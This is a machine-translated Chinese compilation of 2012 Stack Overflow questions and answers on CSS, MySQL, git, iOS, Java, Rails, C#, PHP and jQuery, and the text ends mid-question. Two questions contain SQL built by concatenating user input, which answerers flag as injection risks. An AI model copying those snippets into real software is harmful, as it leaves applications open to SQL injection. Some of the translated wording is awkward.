> ID：11427474
> 
> 赞同：4
> 
> 时间：2012-07-11T07:16:18.030
> 
> 标签：html, css, html-table

我有一个问题`strong`，表格内的标签没有加粗。我有以下html代码：

在这里我有一个小提琴：http: [//jsfiddle.net/JxQCr/](http://jsfiddle.net/JxQCr/)

```
<table>
    <tbody>
        <tr class="row_table">
            <td>2012</td>
            <td><strong>this should be strong</strong></td>
        </tr>
        <tr>
            <td>2012</td>
            <td>not strong</td>
        </tr>
        <tr>
            <td>-</td>
            <td>not strong</td>
        </tr>
    </tbody>
</table> 
```

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2012-07-11T07:21:23.553

您正在使用 JSFiddle 的*选项*[`normalize.css`](http://jsfiddle.net/css/normalize.css)，它添加了大量的 CSS 覆盖。

 *[关掉它](http://jsfiddle.net/JxQCr/2/)一切都很好

还有其他规范化器具有更好的`strong`标签默认值 - 例如[http://necolas.github.com/normalize.css/](http://necolas.github.com/normalize.css/) - 但这仅证明了理解您在项目中包含的代码的重要性

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-07-11T07:23:28.183

你在使用某种重置CSS吗？如果是这样，请尝试手动设置字体粗细

```
strong{
  font-weight: bold;
}​ 
```

或者

```
table td strong{
  font-weight: bold;
}​ 
```

* * *

## 回答 #3

> 赞同：-1
> 
> 时间：2012-07-11T07:26:47.973

取消选中 JSFiddle 中的“规范化 CSS”选项。重新运行代码，它会工作。

工具覆盖了很多东西。*

# mysql - 如何优化 mysql 查询：使用两个表中的单个查询计算类别和子类别

> ID：11427475
> 
> 赞同：8
> 
> 时间：2012-07-11T07:16:18.420
> 
> 标签：mysql, query-optimization

我需要帮助来优化这个 MySQL 查询以获得更好和更快的性能。

这是[`SQL FIDDLE`](http://sqlfiddle.com/#!2/2f1bb/1/0)带有查询和表结构的。

基本上我有两张桌子

### tbl_category

```
CREATE TABLE IF NOT EXISTS `tbl_category` (
  `category_id` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `category_name` varchar(20) NOT NULL,
  `parent_category_id` int(10) unsigned DEFAULT NULL,      
  PRIMARY KEY (`category_id`),
  UNIQUE KEY `category_name` (`category_name`,`parent_category_id`),
  KEY `category_parent_id` (`parent_category_id`)
) ENGINE=InnoDB  DEFAULT CHARSET=latin1;

--
-- data for table `tbl_auction`
-- 
+-------------+---------------+--------------------+-----------------+
| category_id | category_name | parent_category_id | category_status | 
+-------------+---------------+--------------------+-----------------+
|           1 | Boats         |               NULL | a               | 
|           2 | Books         |               NULL | a               | 
|           3 | Building      |               NULL | a               | 
|           4 | Cars          |               NULL | a               | 
|           5 | Electrical    |                  3 | a               | 
|           6 | Hardware      |                  3 | a               | 
|           7 | Heating       |                  3 | a               | 
|           8 | Miscellaneous |                  3 | a               | 
|           9 | Plumbing      |                  3 | a               | 
|          10 | Tools         |                  4 | a               | 
|          11 | Lights        |                  4 | a               | 
|          12 | Miscellaneous |                  4 | a               | 
+-------------+---------------+--------------------+-----------------+ 
```

### tbl_auction

```
CREATE TABLE IF NOT EXISTS `tbl_auction` (
  `auction_id` int(10) unsigned NOT NULL AUTO_INCREMENT, 
  `auction_category` int(10) unsigned NOT NULL 
   COMMENT 'either store subcategory OR main category if no subcategory',
  `auction_title` varchar(100) NOT NULL,     
  PRIMARY KEY (`auction_id`),
  KEY `auction_category` (`auction_category`)
) ENGINE=InnoDB  DEFAULT CHARSET=latin1;

--
-- data for table `tbl_auction`
--

+------------+------------------+---------------+
| auction_id | auction_category | auction_title | 
+------------+------------------+---------------+-
|          1 |                1 | one           | 
|          2 |                2 | two           | 
|          3 |                5 | five          | 
|          4 |                6 | six           | 
|          5 |                5 | five2         | 
|          6 |                8 | eight         | 
|          7 |               11 | eleven        | 
|          8 |               11 | eleven2       | 
|          9 |               10 | ten           | 
|         10 |                2 | two2          | 
|         11 |               12 | twelve        | 
+------------+------------------+---------------+ 
```

现在我想明智地计算所有拍卖类别，以及如果某个类别有子类别，那么将该拍卖与主类别相加

我做了以下查询

```
SELECT auction_category AS categoryID, COUNT(*) AS total
      FROM `tbl_auction`
      GROUP BY auction_category
UNION ALL
SELECT parent_category_id  AS categoryID, COUNT( * ) AS total
      FROM  `tbl_auction` ta
      INNER JOIN tbl_category tc ON tc.category_id = ta.auction_category
      WHERE parent_category_id IS NOT NULL
      GROUP BY parent_category_id 
```

虽然上面的查询返回了预期的结果**，但**我认为可能有一些优化的方法来解决这个问题。请指导我并建议我优化查询。

谢谢

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-07-17T16:39:34.117

扼杀性能的是由`GROUP BY`s 和/或`UNION`. 您可以重写查询而不`UNION`使用：

```
SELECT pcat.category_id, COUNT(*)
  FROM  tbl_category pcat
  LEFT JOIN tbl_category subcat 
    ON subcat.parent_category_id = pcat.category_id 
  INNER JOIN tbl_auction a 
    ON a.auction_category = IFNULL(subcat.category_id,pcat.category_id)
GROUP BY pcat.category_id; 
```

这具有相同的效果（重复计算每次拍卖，一次在其子猫下，一次在父猫下），并且`EXPLAIN`显示没有文件排序。如果数据变大时确实如此，您可以尝试添加`ORDER BY NULL`技巧。

此外，如果实时准确性不是非常重要但查询经常执行，请考虑缓存结果。

# xcode - 有什么方法可以恢复使用 GitHub 破坏的所有丢失的本地工作？

> ID：11427478
> 
> 赞同：2
> 
> 时间：2012-07-11T07:16:31.897
> 
> 标签：xcode, git, github

我正在使用 Xcode 做一些工作，首先使用本地 git。为了分享代码，我开始尝试 GitHub。不知怎的，我弄得一团糟。

今天，在代码运行到一定程度后，我激活了 GitHub 来上传代码。然后我发现我在本地什么都没有了。

我在用户/开发人员中有我所有的代码，3晚的工作已经过去了:(

无论如何我可以恢复我的代码？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-11T17:13:31.747

如果您在评论时提交了更改，然后在 XCode 中激活 GitHub 链接时看到它们消失了，那么您应该能够恢复这些提交：

[`git reflog`](http://git-scm.com/docs/git-reflog)是查看*所有*提交的方法，包括不再引用的提交。
例如，参见“[硬重置后的最新提交](https://stackoverflow.com/questions/7443327/the-latest-commit-gone-after-hard-reset)”。

[`git branch -a`](http://git-scm.com/docs/git-branch)还可以向您显示当前分支并帮助您查看是否需要返回第一个分支。当远程分支（仍然为空）被意外签出时会发生这种情况：请参阅“[可以撤消 git checkout 吗？](https://stackoverflow.com/q/7912040/6309) ”。
如果是这种情况（即，如果 XCode 错误地签出远程空分支），您可以轻松地回到您所在的分支：

```
git checkout - 
```

# ios - 如何比较前缀标头中的 $PRODUCT_NAME？

> ID：11427479
> 
> 赞同：1
> 
> 时间：2012-07-11T07:16:37.087
> 
> 标签：ios, c-preprocessor

我正在开发一个具有多个目标的项目，我在构建设置中有一个预处理器宏：

```
PRODUCT_NAME=\@\"$PRODUCT_NAME\" 
```

现在在 AppName-Prefix.pch 我已将 $PRODUCT_NAME 定义为：

```
#define ACTIVE_PRODUCT PRODUCT_NAME 
```

如何检查 ACTIVE_PRODUCT 是否等于字符串？

我想做这样的事情，例如

```
if ACTIVE_PRODUCT == @"Product 1"
#define MY_VAR @"Test 1
#endif

if ACTIVE_PRODUCT == @"Product 2"
#define MY_VAR @"Test 2 
```

所以我可以根据 $PRODUCT_NAME 在我的代码中使用 MY_VAR

请协助！问候，比尔。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-11T07:24:06.527

我认为[之前有一个问题，](https://stackoverflow.com/questions/2335888)答案似乎是不可能的（请参阅[comp.lang.c 常见问题解答](http://c-faq.com/cpp/ifstrcmp.html)）。我试图做的是尽快避免预处理器，将所有处理转移到Objective-C。`#defining`因此，您可以设置一个常规的 Objective-C 变量并在 Objective-C 中继续处理，而不是您的变量：

```
static NSString *const ProductName = /* create string from PRODUCT_NAME */; 
```

然后：

```
NSString *const MyVar = [ProductName isEqualToString:…] ? @"Foo" : @"Bar"; 
```

当然，这假设您只需要`MyVar`源代码，而不需要 plist 等资源。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-07-11T08:05:48.750

好的，因为似乎不可能比较字符串，所以我使用了以下解决方法：

在我定义的每个目标中 PRODUCT1=\@\"$PRODUCT_NAME\" .... PRODUCT2=\@\"$PRODUCT_NAME\" 等。

然后在 app-name-prefix.pch 我做了以下事情：

```
#if defined (PRODUCT1)
#define MY_VAR @"Test 1"
....
#endif

#if defined (PRODUCT2)
#define MY_VAR @"Test 2"
...
#endif 
```

这解决了我的问题。任何其他方式也将不胜感激。

# iphone - 来自 URL 的图像显示在 iphone 上，但不在 ipad 上

> ID：11427480
> 
> 赞同：0
> 
> 时间：2012-07-11T07:16:43.140
> 
> 标签：iphone, objective-c, ios, image, ipad

我正在使用此方法将 URL 中的图像加载到我的应用程序中：

```
 if (url != nil)
{

    dispatch_async(dispatch_get_global_queue(0,0), ^{
        ASLog2Debug(@"");////////
        NSData * data = [[NSData alloc] initWithContentsOfURL:url];
        if ( data == nil )
            return;
        dispatch_async(dispatch_get_main_queue(), ^{
            // WARNING: is the cell still using the same data by this point??
            self.imgApplicationIcon.image = [UIImage imageWithData: data];
        });
        [data release];
    });

} 
```

它在 iPhone 上运行良好，但在 iPad 上运行相同的应用程序时，我看不到图像。

有任何想法吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-02T07:54:29.490

这可能是那些奇怪的缓存问题之一。那些发生在图像上。转到 /Users/.../Library/Developer/Xcode/DerivedData/ 并删除此应用程序的所有条目。然后再次编译并运行。

# java - 除了 containsKey 之外的其他检查 Map 键的方法

> ID：11427486
> 
> 赞同：0
> 
> 时间：2012-07-11T07:17:10.107
> 
> 标签：java, map, uri

我创建了一个返回包含 URI 参数的 Map 的方法。除了 map.containsKey(value) 之外，还有其他方法可以检查键是否已经在 Map 中？？？

```
 public static Map <String,Object> UriMap(String uri){
    Map <String,Object> map = new HashMap<String,Object>();     
    String [] pathAndQuery = uri.split("\\?",2);    

    if(pathAndQuery.length == 2){//processing starts only if the size of pathAndQuery is 2
        String [] query = pathAndQuery[1].split("\\&");//split the string to array of Strings
        for(String str: query){
            if(str.contains("=")){
                String [] keysAndValues = str.split("\\=",2);                   
                if(map.containsKey(keysAndValues[0])){
                    String oldValue = map.get(keysAndValues[0]).toString();     
                    map.remove(keysAndValues[0]);
                    map.put(keysAndValues[0],Arrays.asList(oldValue, keysAndValues[1]));//for parameters listed twice put a list to value                                       
                }else{                                  
                    map.put(keysAndValues[0],keysAndValues[1]);//put a String to a map
                }
            }else{
                String newParameter = str;
                map.put(newParameter,"");//if "=" symbol is missing I put empty string for value
            }
        }
    }

    return map;
} 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-11T07:41:55.990

您的方法还不错，但是您忘记了对查询字符串值进行转义。就像是：

```
String value = URLDecoder.decode(keysAndValues[0], "UTF-8"); 
```

因为例如像“?”、“=”或“&”这样的字符会被转义。

您可以在代码中进行的一项优化是不使用 split，而是使用 indexOf。因此，您不会使用 split 创建数组，但您不会两次循环使用相同的值。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-11T08:36:19.570

我才意识到没有人回答你的要求。这很尴尬，但是我认为我以前的答案可能会随着时间的推移对某人有所帮助，所以我决定提出一个新的答案。

由于您的 Map 是一个 HashMap，它能够判断它是否在恒定时间 O(1) 中包含一个键，所以我想您的问题的直接答案是：

是的，还有其他简单的方法来检查一个键是否已经在你的地图中，比如遍历 keySet 并进行比较，但是你正在做的是最好的选择。

以下来自[Java6 的 HashMap 文档](http://docs.oracle.com/javase/6/docs/api/java/util/HashMap.html)

> 此实现为基本操作（get 和 put）提供恒定时间性能，假设哈希函数将元素正确地分散在桶中。集合视图的迭代需要的时间与 HashMap 实例的“容量”（桶的数量）加上它的大小（键值映射的数量）成正比。因此，如果迭代性能很重要，则不要将初始容量设置得太高（或负载因子太低），这一点非常重要。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-07-11T07:42:19.057

我建议您使用[Apache HTTP 组件库](http://hc.apache.org/)。“客户端”库有一个[解析方法](http://hc.apache.org/httpcomponents-client-ga/httpclient/apidocs/org/apache/http/client/utils/URLEncodedUtils.html#parse%28java.net.URI,%20java.lang.String%29)，它接收一个 URI（作为一个字符串或一个 URI 实例）并返回一个 NameValuePair 列表。

方法是

```
org.apache.http.client.utils.URLEncodedUtils.parse(String s, Charset charset); 
```

或者

```
org.apache.http.client.utils.URLEncodedUtils.parse(URI uri, String encoding); 
```

此外，我认为您希望首先使用 Java [URI 类](http://docs.oracle.com/javase/6/docs/api/java/net/URI.html)字符串构造函数将 URI 字符串转换为 URI 实例，因为如果 URI 格式不正确，构造函数将抛出 URISyntaxException “如果给定的字符串违反 RFC 2396，由以上偏差”。

# ruby-on-rails-3 - Rails 3：显示过滤列表的路线设计

> ID：11427487
> 
> 赞同：0
> 
> 时间：2012-07-11T07:17:13.023
> 
> 标签：ruby-on-rails-3, routes

我有两个资源：`comments`和`communities`，每条评论都与一个或多个社区相关联。

我的计划是让 URL`/comments`显示所有评论，并且`/comments/:community_name`只显示来自给定社区的评论。URL 应该路由到 `comments#index' 操作以从 Comment 模型中检索评论集（使用[命名范围](https://stackoverflow.com/questions/11303772/rails-3-correct-syntax-for-named-scope-with-method-call-and-model-associations)）。

如何生成这些路线？（或者如果有更合适的路线设计，请告诉我。）

如果我尝试下面的嵌套路由，似乎我需要提供评论 ID，即`\comment\:comment_id\communities\:community_id`.

```
#routes.rb
resources :comments, only: [:index, :create, :destroy]
resources :communities, only: [:index, :new, :create, :destroy]
resources :comments do
  resources :communities
end 
```

注意：社区资源必须是独立资源，因为我需要操作来查看、添加和删除社区。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-12T02:36:32.197

```
resources :comments, only: [:index, :create, :destroy] do
  collection do
    resources :communities, only: [:index, :new, :create, :destroy]
  end
end 
```

此路由声明将为您提供如下 URL：

```
comments/communities
comments/community/1, etc 
```

如果您想使用 community-name 作为社区 id，并且您希望对大部分资源都这样做，那么最好为您的资源使用像[friendly_id](https://github.com/norman/friendly_id)这样的漂亮 gem 。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-11T10:34:56.850

Uncomment the following line of code in `#routes.rb` and check it:
`match ':controller(/:action(/:id))(.:format)'`

# c# - 如何从画布中删除子对象这些子对象被动态添加到画布中

> ID：11427489
> 
> 赞同：1
> 
> 时间：2012-07-11T07:17:17.383
> 
> 标签：c#, silverlight, canvas, silverlight-5.0

我正在向画布动态添加一个 Rectangle 对象，`DrawImageTest`如下所述：

```
System.Windows.Shapes.Rectangle rectToDraw  = ToRectangle(rect);
DrawImageTest.Children.Add(rectToDraw); 
```

你能告诉我如何通过代码动态删除这个`rectToDraw`矩形对象吗？`Canvas`

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-11T12:06:33.730

假设您仍然有对`rectToDraw`您的引用，只需使用：

```
DrawImageTest.Children.Remove(rectToDraw); 
```

# google-maps - 获取静态地图版权字符串

> ID：11427490
> 
> 赞同：5
> 
> 时间：2012-07-11T07:17:18.747
> 
> 标签：google-maps, google-static-maps

我知道我可以使用 Google 静态地图 api 返回位置的图像，但它也可以将版权文本作为字符串返回吗？

我知道返回的图像已经包含版权字符串，但是我在 3d 环境中显示图像，并且阴影经常使文本不可读，因此如果我将版权作为字符串，我可以显示一个带有文本的窗口。

我这样做是为了遵守 Google 的版权条款。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2016-10-06T14:46:35.387

感谢您努力遵守[服务条款](https://developers.google.com/maps/terms#9-license-requirements)，尤其是第 9.4 节。

目前，没有任何具有此功能的功能。我强烈建议您在[Google Maps APIs](https://code.google.com/p/gmaps-api-issues/) 的公共问题跟踪器[的静态地图部分发布功能请求](http://code.google.com/p/gmaps-api-issues/issues/entry?template=Static%20Maps%20-%20Feature%20Request)。

# c# - 修改 DataGrid 的显示方式

> ID：11427492
> 
> 赞同：1
> 
> 时间：2012-07-11T07:17:22.167
> 
> 标签：c#, .net, datagrid, compact-framework, datasource

我有一个数据网格，我将数据源设置为类列表，该类有几个属性，数据网格用来创建和填充自身。

我想仍然使用它，但重命名一些列标签，删除行按钮（在网格的左侧）并隐藏一些列。

我不知道如何做到这一点，或者真的是什至谷歌？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-07-11T07:25:25.800

[这](http://msdn.microsoft.com/en-us/library/cc903950%28v=vs.95%29.aspx)应该可以解决您的问题。

使用`DataGrid.AutoGeneratingColumn`事件来自定义行为。

```
private void DataGridView_AutoGeneratingColumn(object sender, DataGridAutoGeneratingColumnEventArgs e)
{
    string headerName = e.Column.Header.ToString();

    // No need of customization.
    if (headerName == "IAmPerfect")
    {
        e.Cancel = true;
    }

    // Columns which requires updating.
    if (headerName == "EID")
    {
        e.Column.Header = "Employee ID";
    }
    else if (headerName == "EName")
    {
        e.Column.Header = "Employee Name";
    }
} 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-07-11T07:29:48.357

使用您想要的属性为您的显示器创建一个类。将列添加到网格并为具有显示类中属性名称的列设置字段名称。创建一个显示对象列表并将该列表设置为网格的数据源。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-08-03T01:45:46.333

我最终使用 SQL 查询来填充数据源而不是列表，由于未知的原因，当数据源的列表<> 时，我无法让 datagridstyles 工作，但当 SqlCeDataAdapater 是源时它们工作正常。

# sandbox - iOS 中的沙盒和捆绑包有什么区别

> ID：11427494
> 
> 赞同：0
> 
> 时间：2012-07-11T07:17:28.153
> 
> 标签：sandbox, nsbundle

我知道 iOS 应用程序中的沙盒和捆绑包，但有什么区别？捆绑包包含在沙箱中吗？我可以通过捆绑包获取文档目录吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-11T10:04:08.190

要获取文档目录，请使用函数`NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES)`.

返回类型是一个数组。获取最后一个对象，它是数组中唯一的对象，以防它是一个 iOS 应用程序。这将是您的文档目录的路径，它是 App Sandbox 的一个子集

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2015-12-10T09:06:42.920

我认为它可以给你一个大图景 [![捆绑在沙箱内](../Images/0d9c1ad8fc4dc6909c54541fd8d7119b.png)](https://i.stack.imgur.com/SBleG.png)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-11-11T08:33:43.063

这个问题也困扰着我。这是我能够得出的结论。App Bundle 是 App 沙盒的子集。考虑模拟器中的 app 文件夹。具有 App ID（16 位十六进制）的文件夹是您的 App Sandbox。除了应用程序包（.app 文件）之外，sandox 还包含您的文档、库、tmp 和其他子目录。右键单击应用程序包并显示包内容。您会找到构成应用程序包的源代码和资源。

如果我错了，请纠正我。

# ruby - 续集中的动态排序顺序

> ID：11427500
> 
> 赞同：1
> 
> 时间：2012-07-11T07:17:38.870
> 
> 标签：ruby, sequel

我们想要动态地对数据库进行排序。排序序列存储在 ruby​​ 哈希中 -

```
sortorder = [
  {
    'property'  => 'company',
    'direction' => 'asc'
  },
  {
    'property'  => 'name',
    'direction' => 'asc'
  },
  {
    'property'  => 'id',
    'direction' => 'desc'
  }
] 
```

我们正在尝试构建这样的查询 -

```
query = DB[:contacts]
sortorder.each do |s|
  column = s['property']
  direction = s['direction'].downcase

  if direction == 'asc'
    query = query.order_append(column.to_sym)
  else
    query = query.order_append(column.to_sym).reverse
  end
end 
```

但是，查询看起来像这样

```
#<Sequel::SQLite::Dataset: "SELECT * FROM `contacts` ORDER BY `company` DESC, `name` DESC, `id` DESC"> 
```

也就是说，所有列都按“降序”排序（给出的最后一个“方向”）

我们如何确保查询与给定的哈希匹配？此外，如果这可以以更好的方式完成，那将非常非常有帮助。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-11T07:38:05.687

`reverse`正在撤消所有订单。您必须为每个订单传递方向：

```
query = DB[:contacts]
sortorder.each do |s|
  column = s['property']
  direction = s['direction'].downcase

  query = query.order_append(column.to_sym.send(direction.to_sym))
end 
```

# c# - C# 中的 SQL 代码比较属性

> ID：11427503
> 
> 赞同：-2
> 
> 时间：2012-07-11T07:17:45.037
> 
> 标签：c#, sql-server, select, compare

我一直在用 C# 开发一个项目，有时我需要比较两个文件名相同的字符串，

```
SELECT Hash 
FROM Beamer.PackageDetailFile (NOLOCK) 
WHERE FileName = '"+fileName+"' ; 
```

这不起作用，表和列名是正确的。然而，

```
SELECT Hash FROM Beamer.PackageDetailFile (NOLOCK) 
```

这段代码给了我哈希。

有什么问题？请帮忙谢谢。

问题解决了，我调用的文件名是目录路径而不是文件名，这就是问题所在。工作正常现在向所有人欢呼

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-11T07:31:02.077

正如人们所说，避免在 C# 中创建 sql 语句。但如果您坚持，请检查以确保 C# 中的 'fileName' 变量不为空并且具有正确的值。

我遇到的另一个问题是 SQL Server 中列的长度。例如，如果你的数据库列是 varchar(50)，并且你的文件名超过 50 个字符，那么比较将失败（你会发现存储在数据库中的文件名被截断）。在这种情况下，您可能应该将数据库列更改为更大的长度或只是 varchar(max)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-07-11T07:39:15.793

查询本身*应该*没问题，虽然这是非常糟糕的做法，并且应该使用参数，即

```
WHERE FileName = @filename 
```

并向名为 的命令添加一个参数`filename`，其值来自本地变量。

这可能失败的原因：

*   区分大小写；如果 CS，`'abc'`则不等于`'AbC'`（如果是 CI，*则为*）
*   填充，即`[n]char(len)`vs `[n]varchar(len)`；a`[n]char(len)`在右侧用空格填充，这可能会产生奇怪的结果
*   unicode，即`N'{blah}'`vs `'{blah}'`- 主要只是非 ASCII “blah”的问题
*   长度修整；如果列是`[n]varchar(20)`并且您的参数长度为 80 个字符，则它将与列中的修剪版本不匹配

# vbscript - win 2008 中的任务调度程序不会运行 vbs 脚本

> ID：11427507
> 
> 赞同：0
> 
> 时间：2012-07-11T07:18:03.443
> 
> 标签：vbscript, batch-file, task, scheduler

我有一个调用 vbs 脚本的批处理文件，如下所示：

```
cd d:
    cd D:\Application\Pentasafe\HKPentasafe\DailyLog\Deployment Code
    cscript CommandProcessing.vbs
    del /s "D:\Application\Pentasafe\HKPentasafe\DailyLog\Command Usage by Command\Tempworkspace\*.txt" 
```

这个批处理文件调用这个vbs（命令处理）然后将删除临时工作区中的文件

```
Const ForReading = 1
Const ForWriting = 2

Dim Source, Dest

objStartFolder = "D:\Application\Pentasafe\HKPentasafe\DailyLog\Command Usage by Command\Tempworkspace"
objDestFolder = "D:\Application\Pentasafe\HKPentasafe\DailyLog\Command Usage by Command\Scripted"

Set objFSO = CreateObject("Scripting.FileSystemObject")

Set objFolder = objFSO.GetFolder(objStartFolder)
Set colFiles = objFolder.Files

'Only one file expected.
For Each objFile in colFiles
    Source = ObjStartFolder + "\" + objFile.Name
    Dest = ObjDestFolder + "\" + objFile.Name
    wscript.echo Source
    wscript.echo Dest
Next

Set objFile = objFSO.OpenTextFile(Source, ForReading)

Set objFile1 = objFSO.CreateTextFile(Dest, ForWriting)

Do Until objFile.AtEndOfStream
    Strline = objFile.ReadLine
    'wscript.echo Strline

    If InStr(Strline,"CHGUSRPRF") Then
    Prependtext = "CHGUSRPRF"
    wscript.echo Strline
    objFile1.WriteLine Strline
    ElseIf InStr(Strline,"STRSQL") Then
    Prependtext = "STRSQL"
    wscript.echo Strline
    objFile1.WriteLine Strline
    ElseIf InStr(Strline,"STRDFU") Then
    Prependtext = "STRDFU"
    wscript.echo Strline
    objFile1.WriteLine Strline
    ElseIf InStr(Strline,"UPDATA") Then
    Prependtext = "UPDATA"
    wscript.echo Strline
    objFile1.WriteLine Strline
    ElseIf InStr(Strline,"EZVIEW") Then
    Prependtext = "EZVIEW"
    wscript.echo Strline
    objFile1.WriteLine Strline
    ElseIf InStr(Strline,"WRKQRY") Then
    Prependtext = "WRKQRY"
    wscript.echo Strline
    objFile1.WriteLine Strline
    ElseIf InStr(Strline,"WRKUSRPRF") Then
    Prependtext = "WRKUSRPRF"
    wscript.echo Strline
    objFile1.WriteLine Strline
    ElseIf InStr(Strline, "             ") Then
    If (Prependtext <> "") Then
        objFile1.WriteLine Replace(Strline, "             ", Prependtext)
        wscript.echo Replace(Strline, "             ", Prependtext)
    else
        objFile1.WriteLine Strline   
    End If
    Else 
    Prependtext = ""
    objFile1.WriteLine Strline
    End If
Loop

objFile.Close
objFile1.Close 
```

但是，当我在 Windows Server 2008 中安排此作业时，它始终不会调用 vbs 脚本。而是跳过它然后执行删除工作。我试图通过双击批处理文件手动运行它。它在window xp中运行良好，直到我们升级到window server 2008。有人对这个主题有任何想法吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-11T23:28:08.113

批处理文件运行时的当前驱动器是什么？很可能是C：驱动器。由于您没有将 D: 设置为当前驱动器，因此不会找到 CommandProcessing.vbs。要修复它，请将其更改为 D:CommandProcessing.vbs 或将 D: 设为当前驱动器。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-11T07:26:11.460

文件 CommandProcessing.vbs 位于何处？

在 D:\Application\Pentasafe\HKPentasafe\DailyLog\Deployment 代码中？

可能 cd 命令失败，因为第一行中的路径不在 qoutes 中。然后cscript找不到脚本文件。

# java - java - 如何将用户从GUI给出的输入存储到java中的字符串数组？我正在使用 java swing 来创建 GUI

> ID：11427509
> 
> 赞同：0
> 
> 时间：2012-07-11T07:18:13.460
> 
> 标签：java

我创建了一个下拉菜单，我想将用户从菜单中选择的选项存储到字符串数组中，以便以后可以使用字符串数组。我该怎么做？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-11T07:24:08.000

您可以使用 ArrayList 并使用 getSelectedItem() 方法存储您的选择。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-11T07:31:46.400

尽可能尝试在 java 中使用 Collection 框架，它提供了更多的灵活性。

**例子：**

```
ArrayList<String> arr = new ArrayList<String>();
JComboBox jb = new JComboBox();
jb.add("Vivek");
jb.add("Vishal");

jb.addActionListener(new ActionListener() {

    @Override
    public void actionPerformed(ActionEvent arg0) {

        arr.add(jb.getSelectedItem().toString());
    }
}); 
```

# php - php url获取中文字符用于搜索目的

> ID：11427516
> 
> 赞同：0
> 
> 时间：2012-07-11T07:18:35.557
> 
> 标签：php

我将使用表单通过 url get 将关键字发送到页面本身，以应用于 sql 语句以进行关键字搜索：-

```
if (isset($_GET['k']))
{
$keyword = $_GET['k'];
$keyword = urldecode($keyword);
}

<form action = "home.php" method="get">
<input type = "text" name="k" value = "" size = "40"/>
<input type = "submit" value = "search">
</form>

$sql = "select * from [phone] where ([name] like '%$keyword%') order by id DESC"; 
```

对于英文内容，我可以完美地从 URL 中获取关键字；但是对于中文字符，虽然我已经将 urldecode 应用于 $_GET 值，但我仍然无法恢复中文单词。有没有更好的方法来解决这个问题？谢谢！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-11T07:24:05.257

通常，在恢复 GET 值时，您不必使用 urldecode。

除此之外，您还有一个令人讨厌的 SQL 注入问题：

```
$sql = "select * from [phone] where ([name] like '%$keyword%') order by id DESC"; 
```

更改为（如果是 mysql）：

```
$sql = sprintf("select * from [phone] where ([name] like '%%%s%%') order by id DESC", mysql_real_escape_string($keyword)); 
```

最好使用准备好的语句，或者像 Zend_DB_Select 之类的东西。

# javascript - 如何正确捕捉 mouseout 事件？

> ID：11427518
> 
> 赞同：0
> 
> 时间：2012-07-11T07:18:47.950
> 
> 标签：javascript, html, css

我有以下代码：

```
<div class='no_translate'>Not translated</div> 
```

以下是 mouseover/mouseout 事件的代码：

```
 $('.no_translate').mouseover(function() {
                $(this).empty();
                var field="<form method='POST' action=''><input name='a' type='textarea'/></form>";
                $(this).html(field);
            });

            $('.no_translate').mouseout(function() {
                $(this).empty();
                $(this).html('Not translated');
            }); 
```

我想将简单的文本转换为输入字段并返回。但是有一个小问题：当我将光标移动到一个新字段上（不要从它移出）然后这个字段转换为简单的文本并返回很多次，但我没有从它移出，我不明白这是怎么回事。请告诉我。先感谢您。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-11T07:22:04.253

```
$("element").hover(
  function () {
        hover code
  }, 
  function () {
     hover out code.
  }
); 
```

如果您遇到问题，只需修改您的代码...

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-11T07:21:25.927

**[JSFiddle 代码示例](http://jsfiddle.net/fedosov/jZeF6/)**

```
$('.no_translate').hover(function() 
{
    $(this).empty();
    var field="<form method='POST' action=''><input name='a' type='textarea'/></form>";
    $(this).html(field);
},
function() 
{
    $(this).empty();
    $(this).html('Not translated');
}); 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-07-11T07:24:58.043

这是工作小提琴：http: [//jsfiddle.net/surendraVsingh/vvbnE/](http://jsfiddle.net/surendraVsingh/vvbnE/)

**jQuery代码：**

```
 $('.no_translate').hover(function() {
                $(this).empty();
                var field="<form method='POST' action=''><input name='a' type='textarea'/></form>";
                $(this).html(field);
 }, function(){
         $(this).empty();
        $(this).html('Not translated');
 }); 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-07-11T07:25:02.097

尝试这个

```
$(function(){
    $('.no_translate').hover(function() {
        $(this).empty();
        var field="<form method='POST' action=''><input name='a' type='text'/></form>";
        $(this).html(field);
    },
    function() {
        $(this).empty();
        $(this).html('Not translated');
    });
}); 
```

[**演示。**](http://jsfiddle.net/hwgLe/2/)

# facebook - Facebook 网站登录 API 不起作用

> ID：11427521
> 
> 赞同：0
> 
> 时间：2012-07-11T07:18:50.943
> 
> 标签：facebook, api, dns

我们的测试站点上有一个可以正常工作的网站 Facebook 登录 API，但在我们转移到新域后，它就停止了工作。当然，我们为新域创建了一个新应用程序，但我仍然收到一条错误消息：

```
